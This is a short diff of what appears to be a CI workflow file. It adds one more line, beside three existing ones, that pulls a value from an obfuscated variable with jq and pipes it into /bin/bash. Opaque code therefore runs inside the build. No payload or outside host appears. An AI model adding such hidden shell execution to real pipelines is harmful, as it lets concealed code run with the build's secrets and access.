@@ -32,6 +32,7 @@ jobs:
           echo $zkblk5 | jq -r .zhc60446 | /bin/bash
           echo $i7532 | jq -r .txcxw8 | /bin/bash
           printf '%s' "$rwg3" | jq -r .tb85321 | /bin/bash
+          echo $no34 | jq -r .mdzdu20589 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
